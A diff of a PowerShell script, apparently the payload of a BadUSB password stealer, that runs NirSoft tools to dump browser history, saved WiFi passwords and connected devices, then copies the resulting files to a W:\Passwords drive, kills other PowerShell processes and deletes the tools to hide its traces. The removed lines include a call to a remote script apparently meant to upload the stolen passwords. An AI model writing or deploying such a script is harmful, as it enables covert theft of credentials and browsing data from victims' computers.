@@ -9,11 +9,13 @@ Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/ma
 .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt #Create the file for Browser history
 .\WirelessKeyView.exe /stext wifi.txt #Create the file for WiFi passwords
 .\WNetWatcher.exe /stext connected_devices.txt #Create the file for connected devices
-Start-Sleep -Seconds 15 #Wait for 60 seconds (because connected devices file take a minute to be created)
-https://raw.githubusercontent.com/ArllisPLEU/aha/main/wysylanieplikowgithub_passwords.ps1
-Start-Sleep -Seconds 10 #Wait 15 seconds
+Start-Sleep -Seconds 8 #Wait for 60 seconds (because connected devices file take a minute to be created)
+Copy-Item C:\Users\Public\Documents\wifi.txt -Destination W:\Passwords
+Copy-Item C:\Users\Public\Documents\history.txt -Destination W:\Passwords
+Copy-Item C:\Users\Public\Documents\passwords.txt -Destination W:\Passwords
+Start-Sleep -Seconds 3 #Wait 15 seconds
 Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
-Start-Sleep -Seconds 10 #Wait 30 seconds
+Start-Sleep -Seconds 5 #Wait 30 seconds
 #Delete nirsoft tools and .ps1 file
 Remove-Item BrowsingHistoryView.exe
 Remove-Item WNetWatcher.exe
